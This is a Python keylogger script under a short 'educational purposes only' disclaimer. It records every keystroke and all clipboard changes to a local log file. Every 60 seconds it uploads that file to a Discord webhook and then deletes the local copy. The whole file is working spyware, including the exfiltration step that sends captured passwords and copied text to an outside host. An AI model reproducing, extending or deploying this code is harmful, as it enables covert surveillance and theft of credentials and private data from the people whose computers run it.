# DISCLAIMER:
# This program is provided as-is without any warranty. 
# It is intended for educational purposes only. 
# The usage of this program for any malicious activities is strictly prohibited. 
# By using this program, you acknowledge that you are solely responsible for your actions and agree to use it responsibly and legally.

# Use at your own risk!

import time
import requests
from pynput import keyboard
import os
import threading
import pyperclip

def on_press(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as file:
            file.write(str(key) + "\n")
    except Exception as e:
        pass

def upload_log_to_discord():
    webhook_url = 'https://discord.com/api/webhooks/'  # Enter your Discord Webhook URL here
    file_path = "log.txt"

    # Check the file size
    if os.path.exists(file_path):
        if os.path.getsize(file_path) >= 512:  # 512 KB
            with open(file_path, 'rb') as file:
                response = requests.post(
                    url=webhook_url,
                    files={'file': file}
                )
                if response.status_code == 200:
                    print("File successfully uploaded.")
                    file.close()
                    os.remove(file_path)  # Remove the file after uploading
                else:
                    print("An error occurred while uploading the file. Error code:", response.status_code)
        else:
            print("The file size is less than 512 KB. Not uploaded.")

def log_thread():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def upload_thread():
    while True:
        upload_log_to_discord()
        time.sleep(60)  # Wait for 60 seconds

# Start clipboard listener
def clipboard_listener():
    previous_clipboard_content = pyperclip.paste()
    while True:
        current_clipboard_content = pyperclip.paste()
        if current_clipboard_content != previous_clipboard_content:
            with open("log.txt", "a", encoding="utf-8") as file:
                file.write("Copied text: " + current_clipboard_content + "\n")
            previous_clipboard_content = current_clipboard_content
            file.close()
        time.sleep(0.1)  # Wait for 0.1 seconds


# Start the log saving process
log_thread = threading.Thread(target=log_thread)
log_thread.start()

# Start the file upload process
upload_thread = threading.Thread(target=upload_thread)
upload_thread.start()

# Start the clipboard listener process
clipboard_listener_thread = threading.Thread(target=clipboard_listener)
clipboard_listener_thread.start()

# Ensure the main program runs continuously
log_thread.join()
upload_thread.join()
clipboard_listener_thread.join()